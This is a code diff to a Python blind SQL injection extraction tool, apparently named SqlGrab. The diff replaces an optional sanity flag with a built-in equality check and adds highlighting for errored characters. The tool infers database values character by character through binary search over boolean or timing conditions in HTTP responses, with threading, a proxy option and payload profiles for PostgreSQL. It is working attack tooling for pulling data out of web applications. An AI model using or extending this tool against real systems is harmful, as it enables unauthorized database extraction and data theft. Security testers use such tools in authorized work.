@@ -8,7 +8,7 @@ from http.server import BaseHTTPRequestHandler
 from io import BytesIO
 from dataclasses import dataclass
 import time
-from queue import Queue
+from queue import Queue, ShutDown
 import math
 import urllib.parse
 import urllib3
@@ -34,6 +34,8 @@ CHAR_MAX = 0x7E
 SAFE_CHARS = '/'
 INITIAL_LENGTH = 16
 INITIAL_CHAR = ord('Z')
+ERR_SANITY_CHECK = '[!] The result was invalid, either due to a syntax error, too many threads, or because no result exists. Send the requests to Repeater and sanity check them.'
+ERR_UPPER_BOUND = '[!] An upper bound on the output length could not be found. Maybe a syntax error?'
 
 POSTGRESQL_PAYLOADS = { # avoids <, > and quotes
     'length': {
@@ -112,10 +114,8 @@ class SqlGrab:
     threads: int=1
     delay: float=0
     urlencode: bool=False
-    sanity: bool=False
     proxy: str | None = None
     output: bool=False
-    status: str = ''
 
     def __post_init__(self):
         self.payloads = PROFILES[self.dbms]
@@ -153,26 +153,23 @@ class SqlGrab:
             query=query
         )
         length = self._get_length()
-        result = self._get_string(length)
-        return result
-
-    def _done(self, future: Future, payload: str) -> None:
-        self._sanity_check(payload(guess=future.result()))
+        return self._get_string(length)
 
     def _get_length(self) -> int:
         payloads = self.payloads['length']
 
         def update(c: SqlGrab.ValueGrabber.Context):
-            print(f'[+] \x1B[90mDetermining length (Between {c.min} and {c.max})\x1B[0m', end='\r')
+            print(f'[+] \x1B[90mDetermining length (Between {c.min} and {c.max})\x1B[0m\033[K', end='\r')
 
         progress_queue: Queue = Queue()
         future = self.executor.submit(
             self.ValueGrabber(
-                payload=payloads['>'],
+                bigger=payloads['>'],
+                equals=payloads['='],
                 eval_cb=self.evaluate,
                 progress=progress_queue
             ).grab,
-            start=INITIAL_LENGTH
+            guess=INITIAL_LENGTH
         )
 
         if self.output:
@@ -180,10 +177,7 @@ class SqlGrab:
                 context: dict = progress_queue.get(block=True)
                 update(context)
 
-        length = future.result()
-        if self.sanity:
-            self._sanity_check(payloads['='](guess=length))
-        return length
+        return future.result()
 
     def _get_string(self, length: int):
         payloads = self.payloads['character']
@@ -198,6 +192,7 @@ class SqlGrab:
             for r in results:
                 output += (
                     f'\x1B[90m-\x1B[0m' if r == None else
+                    f'\x1B[31m{chr(r.guess)}\x1B[0m' if r.errored else
                     f'\x1B[32m{chr(r.guess)}\x1B[0m' if r.task_id in done else
                     f'\x1b[90m{chr(r.guess)}\x1B[0m'
                 )
@@ -207,22 +202,16 @@ class SqlGrab:
         futures: list[Future] = [
             self.executor.submit(
                 self.ValueGrabber(
-                    payload=partial(payloads['>'], index=i + 1),
+                    bigger=partial(payloads['>'], index=i + 1),
+                    equals=partial(payloads['='], index=i + 1),
                     eval_cb=self.evaluate,
                     task_id=i,
                     progress=progress_queue,
                     range=(CHAR_MIN, CHAR_MAX)
                 ).grab,
-                start=INITIAL_CHAR
+                guess=INITIAL_CHAR
             ) for i in range(length) 
         ]
-
-        if self.sanity:
-            for i, f in enumerate(futures):
-                f.add_done_callback(partial(
-                    self._done,
-                    payload=partial(payloads['='], index=i + 1)
-                ))
         
         if self.output:
             while not all(f.done() for f in futures) or not progress_queue.empty():
@@ -232,23 +221,18 @@ class SqlGrab:
 
         result = ''.join([chr(f.result()) for f in futures])
         
-        if self.sanity:
-            self._sanity_check(self.payloads['compare'](guess=result))
+        if not self.evaluate(self.payloads['compare'](guess=result)):
+            raise RuntimeError(ERR_SANITY_CHECK)
 
         return result
-    
-    def _sanity_check(self, payload: str) -> None:
-        is_equal = self.evaluate(payload)
-        if not is_equal:
-            raise RuntimeError('[!] The result was invalid, either due to a syntax error, too many threads, or because no result exists. Send the requests to Repeater and sanity check them.')
-
 
     @dataclass
     class ValueGrabber:
-        payload: partial
+        bigger: partial
+        equals: partial
         eval_cb: Callable 
+        progress: Queue
         task_id: int | None = None
-        progress: Queue | None = None
         range: tuple[int,int] = (0,math.inf)
 
         @dataclass
@@ -257,16 +241,15 @@ class SqlGrab:
             min: int
             max: int
             guess: int
+            errored: bool = False
 
-        def grab(self, start: int) -> int:
-            return self._get_value(start, self.range)
-
-        def _get_value(self, guess: int, range=(0, math.inf)) -> int:
+        def grab(self, guess: int) -> int:
             ''' Determines the value of a variable based on iterative halving/doubling of the search space '''
-            min, max = range
+            min, max = self.range       
+
             while min != max:
                 is_bigger = self.eval_cb(
-                    self.payload(guess=guess)
+                    self.bigger(guess=guess)
                 )
                 if is_bigger:
                     min = guess + 1
@@ -278,11 +261,22 @@ class SqlGrab:
                 else: # narrow down between that range
                     guess = min + int((max - min) / 2)
                 if guess > 2**32:
-                    raise RuntimeError('[!] An upper bound on the output length could not be found. Maybe a syntax error?')
+                    raise RuntimeError(ERR_UPPER_BOUND)
                 
-                if self.progress:
-                    self.progress.put(self.Context(self.task_id, min, max, guess))
+                self.progress.put(
+                    self.Context(self.task_id, min, max, guess)
+                )
+
+            if self.eval_cb(self.equals(guess=guess)):
+                self.progress.put(
+                    self.Context(self.task_id, min, max, guess)
+                )
+            else:
+                self.progress.put(
+                    self.Context(self.task_id, min, max, guess, errored=True)
+                )
             return guess
+                #raise RuntimeError(ERR_SANITY_CHECK)
 
     @staticmethod
     def urlEncode(text: str) -> str:
@@ -379,7 +373,6 @@ if __name__ == "__main__":
     parser.add_argument('-c', '--condition', required=True, help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.status_code == 401\', \'len(response.content) > 1433\', \'response.elapsed.total_seconds() > 2\'')
     parser.add_argument('--delay', required=False, default=0, type=float, help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
     parser.add_argument('--urlencode', required=False, action='store_true', help='Perform URL-encoding on the payloads (payloads in the request\'s path will always be urlencoded).')
-    parser.add_argument('--sanity', required=False, action='store_true', help='Sanity check inferred results. Useful to help catch inconsistent results.')
     parser.add_argument('--proxy', required=False, help='Proxy to use, e.g. http://127.0.0.1:8080')
 
     args = vars(parser.parse_args())
